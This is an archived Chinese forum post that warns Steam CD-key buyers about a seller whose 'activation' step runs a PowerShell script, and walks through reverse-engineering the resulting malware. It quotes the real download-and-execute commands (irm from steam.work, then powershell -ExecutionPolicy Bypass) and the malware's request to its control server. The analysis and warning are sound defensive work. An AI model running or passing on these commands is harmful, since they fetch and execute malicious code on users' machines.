---
created: 2024-08-17T12:00:00
source: https://www.52pojie.cn/
type: archive-web
modified: 2025-01-15T11:38:17
---

结论放在前面：如果买 cdkey 买到让你要输入某个脚本再激活的，那别去管他，立刻退货并举报商家！原因就直接贴我写这个就行...

该商家在使用 Steam 注入病毒假入库来进行诈骗，证据： https://www.52pojie.cn/thread-1949495-1-1.html 请立即退款，我将会向消费者协会说明本店情况！

## 正文

刚刚去买了个 cdkey 准备送给朋友，结果一看发货介绍感觉有点不对劲：

![](https://attach.52pojie.cn/forum/202407/30/145827ao6s9k6ys3bc0c7k.jpg)

啥啊，irm iex 这不是经典的从网络获取脚本并执行的操作吗，怎么领个激活码还要搞这？

我一开始还以为是自动安装加速器，商家还怪好的捏，直到我激活不了，把这脚本拉下来看了看：

![](https://attach.52pojie.cn/forum/202407/30/145830nke1r0snral6aans.jpg)

![](https://attach.52pojie.cn/forum/202407/30/145840hp7uuxu5dfu1t9p1.png)

好家伙 这玩意整了个极其有欺骗性的东西，因为 powershell 的多行注释正好是<# #>，正好 HTML 文件的开头是

<!DOCTYPE html> 这鸟人给他改成 <#!DOCTYPE html> 就变成 powershell

的注释了.. 我都差点没看出来..网页还做了 UA 判断和跳转，真是够阴损

那么真实的代码就只剩两行了：

  - `irm steam.work/pwsDwFile/new1` `-OutFile` `x.ps1`
  - `powershell.exe` `-ExecutionPolicy` `Bypass ``-File` `x.ps1;`

看得出来，又是下脚本...我们把这玩意也下下来看一眼：

![](https://attach.52pojie.cn/forum/202407/30/145833we4z5wqcr1w4w51r.jpg)

我怎么兑换个激活码你还给我注入上 Steam 了！有病啊！

那么我们便不得不好奇一下注入的文件里到底干了啥呢，我们下下来拖进静态分析，但是里面几乎啥都没有，只有两个有意思的地方：

1. 把危险函数 VirtualAlloc 等 伪装成普通函数：

![](https://attach.52pojie.cn/forum/202407/30/145838c3nhkbmqphhcbhb1.jpg)

2. 里面有 zlib.inflate （图里打错了）

![](https://attach.52pojie.cn/forum/202407/30/145835p9o3wu9zsbc3119u.jpg)

看上去他是在尝试现场解压某种 payload 来执行啊！我们直接开一个 Windows Sandbox 来动态调试一下：

打开 x32dbg，在 zlib.inflate 处打断点，很容易就拿到解压出的东西

![](https://attach.52pojie.cn/forum/202407/30/145956yfkoq8e4m1mkm21f.jpg)

> [eax + 0x4 * 3] -> 解压出缓冲区指针

[eax + 0x4 * 5] -> 解压出数据长度

不看不知道，一看 MZ 开头，PE 格式没跑了，直接一个 savefile 把它存下来，拖进 Binary Ninja

这个文件也有点诡异，有三个 .text 段里面两个都是空的，还有一个 XRef 几乎扫不出来...总之先看一眼 IAT：

![](https://attach.52pojie.cn/forum/202407/30/145847gg0xazz6azah3baz.png)

怎么还引用了一个 winsqlite 啊，看起来像是打算操作 Steam 的数据库？

![](https://attach.52pojie.cn/forum/202407/30/145845mlrjrlvr5p9bbtef.png)

这里还有一些十足诡异的找不到引用的函数，看上去是加密的字符串

（接前文）

那么自然我们现在应该给导出的仅有的几个函数打一下断点看看；首当其冲怀疑的就是这个网络函数

直接先在该 dll 加载前打断点，暂停后在 InternetOpenA 打断点；发现有反调试检测，用 ScyllaHide Basic 轻松过掉

然后就断下来了，我们来看一眼

![](https://attach.52pojie.cn/forum/202407/30/215523o7u1kxxujrgrugg3.png)

直接找到病毒开始请求配置的地方和端点了，大收获啊；但是我们直接访问 http://api.steam.work/api/integral/vs

，他是返回 403 Unauthorized 的，看来可能有什么 UA，POST body 之类的，继续下断点查一下

在 InternetOpenA InternetConnectA HttpOpenRequestA HttpSendRequestA，成功还原整个请求：

HTTP1.1 POST http://api.steam.work/api/integral/vs

Referer: version

user-agent: steam

{"sign":"ckv"}

![](https://attach.52pojie.cn/forum/202407/30/223611wz4vask1886h1rqz.png)

返回值拿到手，只有一串不知道是什么的 hex；我们先再看看其他几个点

sqlite 这边下断点以后啥也没有，可能是激活的时候才会操作（我用的 Windows Sandbox，不知道为什么打不开 Steam……）

于是转移到一台实机上继续分析。

直接拿它给的虚假激活码来激活，可以直接断在 HTTP 请求点

把请求掏出来看看：

![](https://attach.52pojie.cn/forum/202407/30/232903zcb68eeeo4cbzc6c.png)

看起来是成功了，返回一个 code 和一个 data；

这个 ID 又是啥？

![](https://attach.52pojie.cn/forum/202407/30/233035wttovtaonjs6vm6v.png)

哦，哈迪斯的 App ID

那么接着调试，在一通奇奇怪怪的网络请求之后，它下下来一个 8k 的文件到 steam 的目录里

C:\Program Files (x86)\Steam\package\data

![](https://attach.52pojie.cn/forum/202407/30/234856lkzexundx2yad8bn.png)

这是干啥的呢？看看我们正常的 Steam 这里有什么...居然什么都没有！

那么就说明，这个文件是病毒专用的了；我们直接 ImHex 打开

![](https://attach.52pojie.cn/forum/202407/30/235712yzh51mmbzcnc57yd.png)

居然是个数据库！怪不得他要链 winsqlite；那这个数据库里有啥？我们丢进查看器：

![](https://attach.52pojie.cn/forum/202407/30/235849hgwxgdgj3iq30uvz.png)

有个 appid，和两个不认识的 hex；把键名拿去搜搜看：

![](https://attach.52pojie.cn/forum/202407/31/000011c4et5p5r1ara5pe1.png)

![](https://attach.52pojie.cn/forum/202407/31/000018c50rr0c0nmmc1cle.png)

原来是这样！这是一种叫做“清单入库”的已经广为流传的 Steam 免费入库方式，结果被不法商家用于欺诈消费者，十分恶劣！

还有一些相关信息，大家可以自行查看→

https://github.com/pjy612/SteamManifestCache/discussions/374

https://github.com/pjy612/SteamManifestCache/wiki/DecryptionKey |
